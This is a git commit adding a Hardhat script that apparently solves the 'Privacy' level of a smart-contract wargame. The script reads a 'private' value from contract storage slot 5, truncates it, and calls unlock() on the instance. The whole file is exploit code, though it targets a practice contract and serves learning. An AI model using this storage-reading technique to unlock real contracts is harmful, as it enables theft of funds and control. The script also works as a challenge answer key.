ab35aeee3db815d44285e71229bc31efb0addfb6
Mirko Pezo <fireover@tutanota.com>
2023-04-22 15:26:14 +0200

    Add solution for Privacy

---
+++ scripts/PrivacyAttack.js
@@ -0,0 +1,25 @@
+const { ethers } = require("hardhat");
+
+async function main() {
+  const instanceAddress = "0xF68b5b4F3cEF71be1B4c229d0032182e69Aae065";
+
+  const [attacker, user] = await ethers.getSigners();
+  console.log("Using this address for attack:", attacker.address);
+
+  const Contract = await ethers.getContractFactory("Privacy");
+  const contract = Contract.attach(instanceAddress);
+
+  // Attack
+
+  // data[2] is located at storage slot 5
+  const data2 = await ethers.provider.getStorageAt(instanceAddress, 5);
+
+  const slicedData2 = data2.slice(0, 34);
+
+  await contract.unlock(slicedData2);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
